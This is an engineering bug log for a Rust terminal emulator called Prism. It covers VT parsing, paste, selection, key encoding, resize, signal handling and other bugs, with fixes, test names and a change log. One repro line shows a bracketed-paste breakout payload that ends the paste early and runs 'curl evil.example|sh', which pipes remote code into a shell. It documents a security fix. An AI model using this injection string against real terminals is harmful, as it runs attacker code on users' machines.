# Bug log — critical re-evaluation (0.1.x)

**Date:** 2026-07-30
**Method:** Five parallel read-only reviews (prismattyc-core, prismattyc-emulator, host `main`, render/protocol/tests, security/correctness) plus orchestrator cross-check.
**Tip at review:** post–`0e5de00` / `3fdd0f3` (selection polish + gate whitespace fix).
**Scope:** Classic host + claimed matrix rows; experimental rich called out separately.
**Status:** Claim **`prismattyc-classic/0.1.1`** — F1–F19 on tip (dogfood, hybrid mouse, wide/ZWJ, DECOM/DECAWM/1004, abs scrollback select, Kitty CSI-u). Residual: partial mode table; full UAX #29 still unclaimed/033 evidence depth optional.

Severity:

| Sev | Meaning |
|-----|---------|
| **P0** | Crash, data loss, security breakout, or host TTY permanently broken in normal use |
| **P1** | Wrong behavior users hit on claimed features, or high-confidence security footgun |
| **P2** | Edge case, silent app mismatch, or matrix evidence hole |
| **P3** | Nit, unclaimed parity, process/docs drift |

Claimed vs unclaimed: several VT gaps are **matrix exclusions** (mouse report, wide Unicode, full editor CSI). They remain logged when they **silently** break common apps under inherited `TERM`.

---

## Top fix order (recommended)

1. ~~ Bracketed-paste end-sequence breakout (security)~~ **FIXED**
2. ISO colon truecolor misparse (F10 claim) + fix weak test
3. ~~ Alt-screen selection still steals Ctrl+C~~ **FIXED**
4. ~~ Cap terminal geometry / paste size (OOM)~~ **FIXED**
5. Scrolled-in lines drop current SGR
6. ~~ Key encoding: Alt chars + modified arrows + F-keys~~ **FIXED**
7. ~~ PTY read error overwritten by `Disconnected` → false success exit~~ **FIXED**
8. ~~ Hide host caret for each paint (not only at enter)~~ **FIXED**

---

## P1 — fix soon

### — Bracketed-paste delimiter breakout — **FIXED**
- **Where:** `crates/prismattyc/src/main.rs` — `normalize_paste_text`, `handle_paste`
- **What:** With child DECSET 2004, host wraps paste as `CSI 200 ~` … `CSI 201 ~`. Normalization only peels **prefix/suffix** layers. An embedded `\x1b[201~` in the clipboard ends paste early; following bytes run as live input.
- **Repro:** Paste `safe\x1b[201~\ncurl evil.example|sh` into bash with 2004 on.
- **Severity:** P1 (security / paste integrity)
- **Fix:** After outer prefix/suffix peel, strip **all** remaining `\x1b[200~` / `\x1b[201~` from the payload before a single re-wrap. Tests: `normalize_paste_neutralizes_embedded_bracket_delimiters`, `paste_embedded_201_does_not_appear_live_after_wrap`.

### — ISO colon truecolor + colorspace misparsed (F10) — **FIXED**
- **Where:** `crates/prismattyc-emulator/src/lib.rs` — `apply_sgr` (~38/48 mode 2)
- **What:** After `2`, always takes next three ints as R,G,B. xterm/ISO form is `38:2:Pi:Pr:Pg:Pb` (often `38:2::R:G:B` → subparams include a colorspace slot). Pi becomes red; blue leaks as later SGR (can hit `0` = full reset).
- **Repro:** `\e[38:2:0:255:128:0mX` or `\e[38:2::255:0:0mY`
- **Evidence hole (closed):** prior suite only tested isolated colon no-Pi; chaining regressions (semi+bold, fg+bg) were green-washed until group-based parse.
- **Severity:** P1 against claimed F10
- **Fix:** Walk VTE **param groups** (not flat remaining count). Colon form: Pi/RGB from subparams **within the same group** as `38`/`48`. Classic semicolon: after `38` consume exactly the next four **groups** (`2`,`r`,`g`,`b`); leave trailing groups (`1` bold, `48` bg, …) for the main loop. Incomplete semicolon RGB swallows leftovers. Tests cover Pi, empty colorspace, colon±Pi+trailing bold, semicolon alone, semi+bold, fg+bg chain, truncated.

### — Alt-screen selection invisible but still owns Ctrl+C — **FIXED**
- **Where:** `crates/prismattyc/src/main.rs` — `paint` forces `sel = None` on alt; `handle_mouse` / `is_copy_chord` still use real `Selection`
- **What:** On alt (vim/less/htop), drag builds a range with **no** inverse paint; Ctrl+C copies / does **not** send `^C`.
- **Repro:** `vim` → drag → Ctrl+C → child not interrupted.
- **Severity:** P1 (dogfood / host policy)
- **Fix:** On `alt_active`, refuse host selection gestures (mouse + keyboard mark/motion/copy/select-all); clear stale selection; forward keys including Ctrl+C to the child. Tests: `alt_screen_ctrl_c_forwards_interrupt_despite_selection`, `alt_screen_mouse_refuses_selection_gesture`.

### — Unbounded geometry and paste → memory / silent drop — **FIXED**
- **Where:** `usable_terminal_size` (only fixes 0); `handle_paste` (no size cap); `Screen::new`/`resize`; scrollback 10k × width
- **What:** Outer resize `65535×65535` can allocate enormous grids; multi-MB paste is one `Vec` + single `try_send` (full queue → entire paste dropped).
- **Severity:** P1 (resource / reliability)
- **Fix:** Cap geometry at 512 cols × 256 rows (0 still → 80×24); truncate paste payload at 1 MiB after normalize (UTF-8 safe). Tests: `usable_terminal_size_caps_geometry`, `paste_payload_capped_at_one_mib`.

### — Scrolled-in blank lines use default style, not current SGR — **FIXED**
- **Where:** `crates/prismattyc-core/src/lib.rs` — `line_feed` fill `Cell::default()` (~496–497)
- **What:** xterm/VT fill scrolled-in lines with **current** attributes; erase paths already use current style.
- **Repro:** `SGR 41`, LF at bottom margin → new line default bg, not red.
- **Severity:** P1 (classic fidelity; visible in color shells/TUIs)
- **Status:** **Fixed** — `line_feed` region scroll fills with space + `buf.style` (full-screen and DECSTBM). Tests: `line_feed_scroll_fill_uses_current_style`, `margin_scroll_fill_uses_current_style`.

### — `encode_key_to_pty` drops Alt, modified arrows, F-keys — **FIXED**
- **Where:** `crates/prismattyc/src/main.rs` — `encode_key_to_pty`
- **What:** Alt+char sends bare char (no ESC); Ctrl/Shift+arrow always plain CSI; F1–F12 → `None`.
- **Repro:** bash Alt+f / Ctrl+Left; htop F-keys.
- **Severity:** P1 (interactive UX)
- **Fix:** Alt+printable → ESC+char; plain F1–F12 xterm SS3/CSI; **all** modified cursor/Page/Home/End/Delete/Insert via xterm `CSI …;mod …` (`1+shift+2*alt+4*ctrl`); modified F-keys CSI form. Host Shift+selection still intercepts before encode. Tests: `encode_key_alt_b_is_esc_b`, `encode_key_f1_is_xterm_ss3`, `encode_key_ctrl_left_right_are_modified_csi`, `encode_key_ctrl_up_down_and_alt_arrows`, `encode_key_modified_page_home_and_fkeys`.
- **Status:Fixed** (remainder of).

### — PTY read error then `Disconnected` reports clean exit — **FIXED**
- **Where:** `main` PTY drain loop
- **What:** `Ok(Err(e))` sets `pending_child_exit = Some(Some(e))`; next `Disconnected` **overwrites** with `Some(None)` → `Ok(())`.
- **Severity:** P1 (correctness of exit status)
- **Fix:** `note_clean_child_exit` / `note_child_read_error` helpers — clean EOF/Disconnected only sets pending when still `None`; read error is sticky. Test: `pending_child_exit_error_not_overwritten_by_clean`.

### — Host caret shown every paint; never re-hidden — **FIXED**
- **Where:** `paint` always `Show`; `enter_host_modes` `Hide` only once
- **What:** Comment claims caret hidden during full-grid paint; after first paint caret stays visible → trail/double caret on Ghostty-class hosts. Also no DECTCEM (`?25`) tracking (see).
- **Severity:** P1/P2 dogfood (treat as P1 if dogfood still sees double caret)
- **Fix:** `execute!(…, Hide)` at the start of every `paint`; restore from DECTCEM after CUP.

---

## P2 — real bugs / silent app breakers

### — Mid-drag PTY clear leaves selection half-dead — **FIXED**
- **Where:** clear-on-output + `handle_mouse` Drag without re-`begin`
- **What:** After clear, Drag sets `dragged=true` with no anchor; `range()` stays `None` until next Down.
- **Repro:** Drag while `yes` / compile log floods.
- **Status:** **Fixed** — mid-drag after clear restarts the gesture (`begin` at current cell). Test: `drag_after_clear_restarts_selection_gesture`.

### — Mouse never forwarded to child — **FIXED (hybrid ADR-0003)**
- **Where:** host `EnableMouseCapture`; SGR/X10 reports to PTY when child enables mouse
- **What:** Fullscreen apps under full `TERM` got no in-app clicks (only host selection). Related: on alt.
- **Decision (2026-07-31):** ADR-0002 froze host-selection-only; **ADR-0003** implements hybrid Option B.
- **Fix:** Track DECSET 1000/1002/1003/1006; plain mouse → app report; **Shift** → host select/scroll. Alt + tracking + plain forwards (vim path).
- **Tests:** `app_mouse_private_modes_are_tracked`, `encode_mouse_report_*`, `hybrid_plain_click_forwards_sgr_not_selection`, `hybrid_shift_drag_selects_host_not_app`, `hybrid_alt_plain_click_forwards_sgr`, `hybrid_plain_wheel_forwards_not_scroll_view`.
- **Human smoke (2026-08-01):** H12 under prism — vim visual via mouse, htop row select, Ctrl+C exits htop cleanly, host scrollback pan OK. Merged #48.

### — Full `to_child` queue silently drops keys/paste/capability replies — **FIXED**
- **Where:** `try_send`, `CHILD_WRITE_QUEUE_CAP = 32`; `handle_host_key` / `handle_paste`
- **What:** Intentional non-blocking writes made a fast typed burst lose bytes. Users saw an unterminated command or a partial paste.
- **Fix (chosen):** Paste is **chunked** (`PASTE_CHUNK_BYTES`) and enqueued by polling `try_send` under a short total wall-clock budget (`PASTE_SEND_BUDGET`, 250ms) so mild host→child backpressure does not drop the whole clipboard in one non-blocking send. On `Partial`/`Dropped`, ring **BEL** on the outer host (visible feedback). Bracketed paste that was only partially delivered attempts `CSI 201 ~` close. Key bursts are coalesced into one bounded `ChildWrite` message and polled under one short `KEY_SEND_BUDGET`; the pending burst flushes at every non-key boundary. On failure, ring **BEL** on the outer host. Capability replies remain non-blocking `try_send` control traffic. Queue remains capacity-bounded (32). (Stable std only — no `SyncSender::send_timeout`.)
- **Tests:** `key_burst_coalesces_and_reassembles_without_loss`, `key_burst_reports_drop_within_budget_when_queue_stuck`, `paste_chunks_across_queue_and_reassembles`, `paste_reports_dropped_quickly_when_queue_full_and_stuck`, `enqueue_paste_chunks_partial_when_budget_expires`; existing F8 try_send tests retained for keys/control.

### — Ctrl+Space one-cell mark blocks Ctrl+C interrupt — **FIXED**
- **Where:** mark sets `dragged=true` → `range().is_some()` → copy chord wins
- **What:** Accidental mark then Ctrl+C never interrupts until Esc.
- **Fix:** `selection_claims_ctrl_c` — only multi-cell ranges claim Ctrl+C as copy; one-cell mark forwards `^C`. ADR-0001 D-H4. Tests: `ctrl_space_one_cell_mark_ctrl_c_forwards_interrupt`, `multi_cell_selection_ctrl_c_still_copies_not_interrupt`.

### — Mouse gesture does not clear `keyboard_select_mode` — **FIXED**
- **Where:** `handle_mouse` vs `handle_host_key`
- **What:** After Ctrl+Space then mouse drag, plain arrows still host-local.
- **Fix:** `handle_mouse` takes `&mut keyboard_select_mode` and clears it on any left-button gesture (and on alt refuse path). Test: `mouse_down_clears_keyboard_select_mode`.

### — Missing Reverse Index `ESC M` under DECSTBM — **FIXED**
- **Where:** `esc_dispatch`
- **What:** At top margin, RI should scroll region down; no-op → pager/TUI glitches.
- **Status:** **Fixed** on main (RI / `ESC M` under DECSTBM).

### — No DSR/CPR (`CSI 6 n`) — **FIXED** (common DSR)
- **Where:** `csi_dispatch` / host drain of `pending_replies`
- **What:** Apps waiting for `CSI r;c R` can block forever.
- **Fix:** `CSI 6 n` → CPR `CSI row;col R` (1-based); `CSI 5 n` → status OK `CSI 0 n`. Host drains `pending_replies` to the child after feed. Other DSR params still ignored.

### — IL/DL/ICH/DCH/ECH/SU/SD silently no-op — **fixed**
- **Where:** `csi_dispatch` (`L`/`M`/`@`/`P`/`X`/`S`/`T`)
- **What:** Editor-style updates leave stale glyphs. Unclaimed but high impact if `TERM` advertises them.
- **Fix:** `Screen::insert_lines` / `delete_lines` + CSI `L`/`M`; `Screen::scroll_up_region` / `scroll_down_region` + CSI `S`/`T` (default param 1; fill space+current SGR; `T` only bare ≤1 param); `Screen::insert_chars` / `delete_chars` / `erase_chars` + CSI `@`/`P`/`X` (cursor row, space+current SGR).

### — `CSI d` (VPA) missing — **FIXED**
- **Where:** `csi_dispatch`
- **What:** terminfo VPA+CHA positioning wrong.
- **Status:** **Fixed** on main (CSI `d` VPA).

### — SGR pen reset / not global across alt enter — **FIXED**
- **Where:** `clear_alt_buffer` zeros style; pen is per-buffer
- **What:** xterm pen is often terminal-wide; `31m` then `1049h` then print may not be red.
- **Status:** **Fixed** — alt enter/clear carries primary (or active) SGR onto alt; leave 47/1047 carries alt pen back to primary; 1049 still DECSC/DECRC. Tests: enter + `alt_leave_1047_carries_pen_back_to_primary`, `alt_leave_mode47_carries_pen_back_to_primary`, `alt_leave_1049_still_restores_decsc_pen`.

### — `extract_text` / OOB `start_col` invents a cell — **FIXED**
- **Where:** `selection_col_span` clamps `start_col.min(end_col)`
- **What:** Paint covers nothing; extract may return last cell. Public `set_range` can disagree with paint.
- **Status:** **Fixed** — `selection_col_span` returns `None` when `start_col` is past the last grid column (no inward invent); in-range end still clamps. Tests: `oob_start_col_selection_col_span_is_none`, `oob_start_col_extract_is_empty_and_paint_cover_false`.

### — Pending wrap lost on DECSC restore / 1049 leave — **FIXED**
- **Where:** `save_cursor`/`restore_cursor`/`leave_alt_screen`
- **What:** Delayed wrap not part of saved state; next char overwrites last column.
- **Status:** **Fixed** — `SavedCursor` bundle (cursor + `wrap_pending` + SGR) on DECSC/`ESC 7`, DECRC/`ESC 8`, and CSI `?1049` enter/leave. Tests: `decsc_restores_wrap_pending`, `mode1049_leave_restores_wrap_pending`.

### — `erase_display(3)` / `CSI 3 J` does not clear scrollback — **FIXED**
- **Where:** `erase_display` treats `2|3` the same
- **What:** xterm ED3 drops scrollback; latent until scrollback UI.
- **Fix:** mode 3 clears viewport like mode 2, `scrollback.clear()`, and `bump_epoch()`; mode 2 unchanged.

### — Cursor visibility `CSI ? 25` not tracked — **FIXED**
- **Where:** `apply_private_mode` + host always `Show`
- **What:** Apps hide cursor; Prism still shows host caret.
- **Fix:** Track DECTCEM on `Emulator::cursor_visible` (default true); `paint` Shows only when true.


### — Resize resets DECSTBM / leaves scrollback widths stale — **FIXED**
- **Where:** `resize_buffer` forces full scroll region; scrollback rows keep old lengths
- **What:** Live resize during margin apps wrong; future scrollback view broken widths.
- **Status:** **Fixed** — `Screen::resize` restores clamped DECSTBM on primary/alt (one-line → full screen); rewrites scrollback row widths to new columns. Tests: `resize_preserves_decstbm_margins`, `resize_invalidates_one_line_decstbm_to_full_screen`, `resize_rewrites_scrollback_line_widths`.

### — Leave 1047/1049 does not clear alt (only enter does) — **FIXED**
- **Where:** `leave_alt_screen` vs xterm reset
- **What:** 1049l then 47h may show stale alt content.
- **Status:** **Fixed** — 1047/1049 leave clears alt buffer; mode 47 still preserves. Tests: `mode1049_leave_clears_alt_for_mode47_reenter`, `mode1047_leave_clears_alt_for_mode47_reenter`.

### — `content_epoch` ignores put_char/erase — **FIXED**
- **Where:** `bump_epoch` only scroll/alt/resize
- **What:** Host compensates with clear-on-any-output for finished ranges; mid-gesture / epoch-only consumers stay wrong. Document or bump on cell mutations.
- **Status:** **Fixed** — `put_char`, `erase_line`, `erase_display` (incl. mode 2), `erase_chars`, `insert_chars`, `delete_chars` bump `content_epoch`. Scroll/IL/DL/alt/resize paths unchanged. Test: `content_epoch_bumps_on_put_char_and_erase`.

### — DECSC saves position only (not SGR) — **FIXED**
- **Where:** `save_cursor` / `restore_cursor`
- **What:** `ESC 7` … attrs … `ESC 8` does not restore pen.
- **Status:** **Fixed** — same `SavedCursor` SGR pen restore on DECRC and 1049 leave. Tests: `decsc_restores_sgr_style`, `mode1049_leave_restores_sgr_style`.

### — Truncated `38;2;R;G` reinterprets leftovers as SGR — **FIXED**
- **Where:** `apply_sgr` incomplete RGB
- **What:** Missing blue → `1`/`31` become bold/red instead of reject.
- **Fix:** Incomplete mode-2 RGB consumes remaining components without applying them as independent SGR codes.

### — Child inherits outer `TERM` with no Prism identity — **FIXED**
- **Where:** `PtySession::spawn` / `apply_child_term_env`
- **What:** Full outer `TERM` (often `xterm-kitty` / `alacritty` / `ghostty`, or host `xterm-256color`) advertised sequences Prism ignores → silent layout bugs (amplifies 015); no Prism identity.
- **Fix:** Always force child env at spawn (never inherit outer terminal identity):
  - `TERM=prism-256color` when bundled terminfo resolves ([`CHILD_TERM`](../crates/prismattyc-emulator/src/lib.rs)); else `xterm-256color` fallback.
  - `TERMINFO` points at repo/binary-bundled `terminfo/` database (`PRISM_TERMINFO` override).
  - `TERM_PROGRAM=prism` — Prism identity for apps that probe `TERM_PROGRAM`.
  - `COLORTERM=truecolor` — matches claimed F10 truecolor SGR.
  - Strip outer-host hints (`KITTY_*`, `ALACRITTY_*`, `GHOSTTY_*`, `WEZTERM_*`, `VTE_VERSION`, `ITERM_*`, `WT_*`, `LC_TERMINAL*`, `TERM_PROGRAM_VERSION`, …).
- **TERM choice rationale:** Matrix claims F4/F5/F10/F13; `prism-256color` is `use=xterm-256color` under Prism's name so apps get a known feature set without proprietary outer terminfo. Source: [`terminfo/prism-256color.src`](../terminfo/prism-256color.src). Residual: system wcwidth / wide Unicode still exclusion (not fixable by terminfo alone).
- **Evidence:** `apply_child_term_env_forces_prism_identity`; `bundled_prism_terminfo_resolves_in_workspace`; `real_pty_child_sees_prism_term_not_outer`.

### — `PtySession` Drop without wait/kill — **FIXED**
- **Where:** emulator PTY wrapper
- **What:** Zombies / orphan children on early error paths; spawn before `TerminalGuard::enter`.
- **Status:Fixed** — `Drop` / `kill_and_reap` best-effort kill + wait (idempotent). Complements signal exit (no host wait). Test: `pty_session_drop_kills_and_reaps_child`.

### — Terminal restore only via Drop; no signal handlers — **FIXED**
- **Where:** `TerminalGuard` + main from-PTY drain
- **What:** `kill`/SIGHUP leaves outer TTY raw/alt/mouse on until `reset`. Follow-on: continuous child output kept the unbounded `try_recv` drain non-empty so `signal_exit_requested()` at the top of the outer loop was never re-checked (`yes` flood starved exit; TerminalGuard Drop never ran).
- **Status:Fixed** — Unix SIGINT/SIGTERM/SIGHUP set an async-signal-safe flag; main loop exits so Drop runs `restore_host_terminal_once` (AtomicBool ownership; double-restore safe). Signal-exit path returns immediately **without** blocking `session.wait` so a live interactive child cannot hang restore (orphan/zombie cleanup remains child-EOF still waits). Drain loop re-checks the signal flag each message and applies `MAX_PTY_DRAIN_PER_TICK` so flood cannot starve signal/paint. Tests: `take_host_terminal_ownership_is_idempotent`, `install_terminal_signal_handlers_is_reentrant`, `signal_exit_must_not_block_on_child_wait`, `pty_drain_observes_signal_under_continuous_flood`, `pty_drain_budget_yields_before_queue_empty`, live `real_binary_sigterm_exits_under_pty_flood`.

### — No ANSI tests for selection inverse / `render_composed` — **FIXED**
- **Where:** `prismattyc-render` tests
- **What:** XOR inverse regressions stay green; F6 paint chrome unasserted on wire.
- **Status:** **Fixed** — `render_composed` selection ANSI coverage: CSI 7 inverse for selected cells, XOR toggle when storage already inverse, multi-row trailing-space trim (no inverse on pure trailing blanks via `selection_covers_cell`). Tests: `render_composed_selection_emits_inverse_sgr`, `render_composed_selection_xors_existing_inverse`, `render_composed_multi_row_selection_skips_trailing_space_inverse`.

### — F4 1049 cursor restore and F5 DECSTBM set-home under-tested
- **Where:** matrix evidence vs tests
- **What:** Claims stronger than assertions.

### — Live PTY tests are substring-only
- **Where:** `crates/prismattyc/tests/live_pty_fast_child.rs`
- **What:** Weak F2/F4/F8 automation (no host-restore byte proof).

### — Experimental-rich per-byte feed stalls event loop — **FIXED**
- **Where:** `process_rich_chunk` (TTY host + `prismattyc-host` rich path)
- **What:** Flood under `--experimental-rich` froze input/paint (not product claim).
- **Status:** **Fixed** — plain-text slices (no ESC, collector idle) are fed in one `Emulator::feed`. ESC-bearing / in-flight APC bytes stay single-byte so scroll-vs-APC order holds. Tests: `process_rich_chunk_flood_stays_responsive` in `prism` and `prismattyc-host`.

### — No scrollback **view** (wheel / PageUp / scrollbar) — **FIXED (MVP)**
- **Where:** host paint was viewport-only; `Screen` scrollback stored (023) but not navigable
- **What:** After flood or large paste, mouse wheel and PageUp did not reveal history. Home/End only move the **child** cursor (readline), not history pan.
- **Human smoke (2026-07-30):** Confirmed gap during H9; dogfood blocker.
- **Fix (MVP):** Host `view_scroll` offset; `Screen::view_cell` / `max_view_scroll`; `AnsiRenderer::render_scrolled`. **Mouse wheel** and **Shift+PageUp/PageDown** pan primary history (bare PageUp/PageDown still go to child for less/vim). Caret hidden while scrolled; any other key jumps to live bottom. Alt screen forces live view. **Selection in history view:** viewport-coordinate drag/word/line + inverse paint + `extract_text_view` for OSC 52 copy; wheel still clears selection. Tests: `view_cell_*`, `extract_text_view_reads_scrolled_history`, `shift_pageup_scrolls_view_*`, `mouse_wheel_scrolls_view`, `mouse_drag_selects_while_scrolled`.
- **Follow-up:** scrollbar chrome, optional “follow output while scrolled”.

### — Ctrl+Space mark unreliable on real hosts — **docs pass (code unchanged)**
- **Where:** `is_mark_key` — Ctrl+Space / Ctrl+2 / NUL → one-cell mark + `keyboard_select_mode`
- **What:** Unit tests pass; interactive H6 often fails because **outer desktop/IME steals Ctrl+Space** (GNOME/Kitty/etc.) so Prism never sees the key.
- **Human smoke (2026-07-30):** Ctrl+Space did not engage mark; Ctrl+C correctly interrupted a flood when no multi-cell selection (path).
- **Docs pass (2026-07-31):** README + ADR-0001 state **Shift+arrow** primary grow, **Ctrl+2** preferred mark, Ctrl+Space only with host-capture caveat. Multi-host delivery matrix still optional human follow-up.
- **IME follow-up:** `prismattyc-host` now renders winit IME preedit and sends
  only committed UTF-8 to the child. Ctrl+Space remains environment-dependent:
  an active IME or desktop may consume Ctrl+Space or Ctrl+2 before the host sees
  it. Use Shift+arrow or Ctrl+2 when the environment delivers it.
- **Still deferred (human matrix):** Kitty / GNOME Terminal / bare console —
  which environments deliver Ctrl+Space when no IME or desktop shortcut owns it.

---

## Deferred human-test follow-ups (post–2026-07-30 smoke)

Interactive dual-sign batch smoke (H1–H12 on tip after #19–#28) was **green** for claimed classic paths. The following were **explicitly not claimed done** and should be re-tested when implemented or when product policy is decided:

| Track | Bug | Trigger to re-test |
|-------|-----|--------------------|
| Scrollback view | — | **MVP landed** (human re-check green 2026-08-01); edge autoscroll / abs multi-page select still optional |
| Ctrl+Space / keyboard mark | — | **Docs pass** — multi-host delivery matrix still optional |
| Mouse policy | — | **Done** — ADR-0003 hybrid on main (#48); human H12 green 2026-08-01 |

---

## P3 — lower priority / nits

| ID | Summary |
|----|---------|
| — | `normalize_paste_text` only end-aligned layers (concat dual wraps) — **fixed** (O(n) mid-stream strip + concat test) |
| — | Resize fail-closed leaves host vs grid skew with no signal — **fixed** (outer BEL on PTY resize failure) |
| — | `render_composed` `chars.nth` O(n²) / fragile if cell ever holds `\n` — **fixed** (precompute row `Vec<char>`) |
| — | `take_reader` not one-shot-safe (second call empty EOF) — **fixed** (Option + error on second take) |
| — | CSI `s`/`u` (SCO save/restore) ignored — **fixed** (same slot as DECSC/DECRC) |
| — | `PRISM_KEY_DEBUG` logs to `/tmp/prism-keys.log` (shared-host footgun) — **fixed** (`PRISM_KEY_DEBUG_PATH` / XDG_RUNTIME / per-user tmp) |
| — | Capability `granted` tracks queue enqueue, not PTY write success — **fixed** (grant after writer flush) |
| — | Host paint emits raw cell scalars with no C0 filter (defense in depth) — **fixed** (`sanitize_paint_char`) |
| — | `active` expect if invariant broken — **fixed** (debug_assert + heal/fallback) |
| — | Soft reset / RIS (`CSI ! p`, `ESC c`) — **partial fixed** (DECSTR keep grid; RIS ED3+scrollback wipe; no full mode table) |
| — | Interactive smoke text in test script may lag F10 claim wording — **fixed** (`scripts/test-phase1.sh` F10–F12 + dogfood) |
| — | Scrollback view MVP (wheel + Shift+PgUp) — **fixed**; selection-in-history follow-up |
| — | Ctrl+Space mark — **docs pass** (Shift+arrow / Ctrl+2 preferred; multi-host matrix optional) |

---

## Explicitly solid (do not thrash)

- OSC 52 host encode: size, whitespace-only, C0/C1 rejection; child OSC not forwarded to host
- Classic path ignores APC when experimental-off; protocol bounds (4096 / attachment caps)
- From-PTY queue backpressure; host→child keys/control non-blocking under flood; paste chunked + short budget + BEL on drop (fixed)
- Private modes 47/1047/1049/2004 wiring at high level
- DECSTBM invalid → full screen; min two lines
- Final paint before EOF for fast children
- No `unsafe` in workspace crate sources
- Spawn uses argv list (no shell metachar join)

---

## Suggested ticket mapping (when opening Waypoint)

| Bucket | Bugs | Notes |
|--------|------|-------|
| Security / paste | 001, 004 (paste cap) | ADR-0001 D-H4 follow-on |
| F10 truecolor | 002, 027 | Fix parser + ISO tests |
| Host selection | 003, 009, 012, 013, 047 | ADR-0001; Ctrl+Space host matrix |
| Host input | 006, 010 (policy), 011 | encode_key + TERM / mouse policy |
| Scrollback UX | 021, 023, 046 | storage + view + select-in-history |
| Core VT fill/scroll | 005, 014, 020, 021, 023–026 | classic growth |
| CSI growth | 015–017, 022, 044 | optional matrix rows |
| Hardening | 004 (geom), 007, 008, 029, 030 | lifecycle |
| Evidence | 031–033, 002 test | matrix honesty |

---

### — Soft reset / RIS incomplete — **partial fixed** (claim polish 2026-08-01)
- **Where:** `csi_dispatch` / `esc_dispatch`
- **What:** Apps issuing DECSTR / RIS expect reset; Prism ignored.
- **Partial fix:**
  - **DECSTR** `CSI ! p` → `Screen::soft_reset` (full region, default SGR, clear wrap, **DECOM off**, **DECAWM on**; keep grid/cursor/scrollback); emulator restores **DECTCEM**, clears **1004 focus**; **keeps** mouse (ADR-0003 soft path) and bracketed paste.
  - **RIS** `ESC c` → leave alt (1049), `ris_reset` (home, ED3 wipe, DECOM off, DECAWM on), clear paste + **mouse** + **focus**, DECTCEM visible.
- **Still unclaimed:** full xterm private-mode table (keyboard protocol modes, alternate mouse encodings, …).
- **Evidence:** `soft_reset_restores_claimed_modes_keeps_mouse`, `ris_clears_claimed_private_modes`, plus earlier soft/RIS tests.

## Change log

| Date | Change |
|------|--------|
| 2026-07-30 | Initial fan-out re-evaluation log from five parallel reviews |
| 2026-07-30 | **Fixed** (scroll fill uses current SGR) and (OOB `start_col` no longer invents cells) in prismattyc-core |
| 2026-07-30 | **FIXED** (ISO colon truecolor + colorspace) (truncated RGB) in `apply_sgr` |
| 2026-07-30 | **FIXED** semicolon chaining regression: group-based `apply_sgr` (no flat `remaining≥4` Pi heuristic); tests semi+bold, fg+bg chain, colon+trailing bold |
| 2026-07-30 | **Fixed** — ANSI emission tests for selection inverse / XOR / multi-row trailing-space trim in `prismattyc-render` |
| 2026-07-30 | **FIXED** force child `TERM=xterm-256color` + `TERM_PROGRAM=prism` + `COLORTERM=truecolor`; strip outer-host identity env at `PtySession::spawn` |
| 2026-07-30 | **Fixed 026** — DECSC/DECRC + 1049 leave save/restore wrap_pending and SGR pen (prismattyc-core) |
| 2026-07-30 | **FIXED** — Unix SIGINT/SIGTERM/SIGHUP → flag → exit → `TerminalGuard` Drop restore (idempotent ownership) |
| 2026-07-30 | hang fix — signal-exit path no longer blocks on `session.wait` of a live child (restore promptly) |
| 2026-07-30 | flood fix — check `signal_exit_requested` inside from-PTY drain + `MAX_PTY_DRAIN_PER_TICK` budget so continuous child output cannot starve signal exit |
| 2026-07-30 | **FIXED** — 1047/1049 leave clears alt (mode 47 preserves) |
| 2026-07-30 | **FIXED** remainder — Ctrl+Up/Down, Alt/Shift/Ctrl combos, modified F/Page/Home |
| 2026-07-30 | **FIXED** — resize preserves DECSTBM (clamped; full-screen grows) + scrollback column widths |
| 2026-07-30 | **FIXED** — PtySession Drop kill+reap (idempotent; no kill after wait) |
| 2026-07-30 | **FIXED** — content_epoch bumps on put_char/erase cell mutations |
| 2026-07-30 | **FIXED** — SGR pen terminal-wide across alt enter/clear |
| 2026-07-30 | Human smoke H1–H12 green on post-#19–#28 tip; log deferred re-tests: scrollback view Ctrl+Space host matrix mouse policy |
| 2026-07-30 | **FIXED** MVP — host scrollback view (wheel + Shift+PageUp/Down); dogfood blocker |
| 2026-07-30 | Scrollback UX: Shift+Home/End jump; OSC title while scrolled; DSR CSI 5 n status OK |
| 2026-07-30 | Selection: keep mid-drag under child output (less flicker); title · new while scrolled; bug-log titles for 005/014/017/019/031 |
| 2026-07-30 | Scroll UX: bottom-right status chip; Shift+wheel pages history |
| 2026-07-30 | Host find in history (Ctrl+Shift+F); chip/title optional via PRISM_SCROLL_* |
| 2026-07-31 | **policy:** ADR-0002 host-selection-only mouse; app mouse remains matrix exclusion |
| 2026-07-31 | **code:** explicit no-op DECSET mouse modes + `app_mouse_private_modes_are_ignored` |
| 2026-07-31 | **hybrid:** ADR-0003 track 1000/1002/1003/1006; plain SGR to child; Shift host select |
| 2026-08-01 | **merged** #48; human H12 green (vim/htop mouse + scrollback) |
| 2026-08-01 | **follow-up:** bundled `prism-256color` terminfo + `TERMINFO` at spawn |
| 2026-08-01 | **ADR-0004** wide Unicode first slice (width-2 cells + paint/extract) |
| 2026-08-01 | **DECOM** origin mode CSI ? 6 (CUP relative + CPR + RIS/DECSTR clear) |
| 2026-08-01 | **Focus 1004:** track DECSET; CSI I/O on FocusGained/Lost |
| 2026-08-01 | Combining marks; absolute scrollback select; extended keyboard (CSI 27 / Super / BTAB) |
| 2026-07-30 | Find polish: case-insensitive by default; Shift+Enter / Shift+F3 previous match |
| 2026-07-30 | Nested outer-PTY UX harness (`tests/nested_pty_ux` + `docs/testing-ux.md`) — scroll title, find chrome; human dogfood still for outer-host chords |
| 2026-07-30 | Dual-sign FAIL fixes: copy/Esc before jump-to-live when scrolled; find+chip paint; stronger nested find asserts; ADR-0001 scrollback select |
| 2026-07-31 | Find chrome shows match rank `n/m` (history_match_rank / count_history_matches) |
| 2026-08-31 | **FIXED** (PT-108 follow-up) — `space save` gives each live session the attach-tabs cache omits its own tab, not a warning; the session no longer drops from the arrangement |
| 2026-08-31 | **FIXED** (macOS) — the app bundles and deep-signs `pmux`, `pmuxd`, and `pmux-attach`; Finder-launched space chips no longer depend on the shell `PATH` |
| 2026-08-31 | **FIXED** (PT-108 open-side mirror) — clicking a space chip regrouped by ephemeral session id, so a session already live under a drifted id (respawn / daemon rebind) was re-attached as a duplicate pane. `regroup::apply` now resolves the fresh cache's ids to stable names via a daemon snapshot and matches each live pane by its recorded name; an empty snapshot falls back to id matching |
| 2026-08-31 | **FIXED** (PT-170) — opening a space into a bare host kept the launch shell as pane 1 of the first tab; `regroup::apply` now closes a reused window's sole local pane once that window holds a session (it survives when no session lands there) |
